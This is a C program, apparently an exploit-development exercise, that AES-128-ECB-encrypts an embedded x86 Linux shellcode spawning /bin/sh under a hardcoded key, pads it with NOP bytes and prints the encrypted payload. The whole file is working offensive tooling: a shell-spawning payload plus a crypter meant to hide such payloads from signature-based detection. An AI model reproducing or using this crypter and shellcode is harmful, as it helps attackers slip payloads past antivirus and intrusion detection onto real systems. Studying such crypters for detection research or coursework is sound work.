#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define CBC 0
#define ECB 1
#include "aes.h"


#define BLOCK_LENGTH 16

uint8_t key[BLOCK_LENGTH] = { 'm','y','-','b','a','d','-','k','e','y' };	//128bit key
unsigned char shellcode[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";



main(int argc, char **argv)
{
	int i, j, blocks, shellcode_size, valid_bytes;
	uint8_t block[BLOCK_LENGTH], block_enc[BLOCK_LENGTH];
	shellcode_size = sizeof(shellcode);
	--shellcode_size;	//sice shellcode in entered as a string, theres a null byte at the end!

	printf("AEScryptor\n\n");


	printf("Key:\n");
	for (i = 0; i < BLOCK_LENGTH; ++i)
		printf("%c", key[i]);
	printf("\n");
        for (i = 0; i < BLOCK_LENGTH; ++i)
                printf("\\x%02x", key[i]);
	printf("\n\n");


	blocks = (shellcode_size % BLOCK_LENGTH == 0) ? shellcode_size / BLOCK_LENGTH : shellcode_size / BLOCK_LENGTH + 1;
	printf("Shellcode (Length=%i -> %i blocks):\n", shellcode_size, blocks);
	for (i = 0; i < shellcode_size; ++i)
		printf("\\x%02x", shellcode[i]);
	printf("\n\n");




	//encrypt blockwise and print
	printf("Encrypted shellcode (Length=%i):\n", blocks * BLOCK_LENGTH);
	for (i = 0; i < blocks; ++i)
	{
		//initialize input block with nop instructions, so we have a complete block  at the end
		for (j = 0; j < BLOCK_LENGTH; ++j)
			block[j] = 0x90;	//NOP

		//valid bytes in this block:
		valid_bytes = (shellcode_size > BLOCK_LENGTH) ? BLOCK_LENGTH : shellcode_size;
//		printf("DEBUG: valid_bytes %i\n", valid_bytes);

		//prepare input block
		for (j = 0; j < valid_bytes; ++j)
			block[j] = shellcode[i * BLOCK_LENGTH + j];

		//encrypt block
		AES128_ECB_encrypt(block, key, block_enc);

		//print encrypted block
		for (j = 0; j < BLOCK_LENGTH; ++j)
			printf("\\x%02x", block_enc[j]);

		//debug decrypt again
		//reset input
/*		for (j = 0; j < BLOCK_LENGTH; ++j)
                        block[j] = 0xAA;
		AES128_ECB_decrypt(block_enc, key, block);
		printf("\n");
                for (j = 0; j < BLOCK_LENGTH; ++j)
                        printf("\\x%02x", block[j]);
		printf("\n\n");
//*/

		shellcode_size -= BLOCK_LENGTH;
	}
	printf("\n");
}

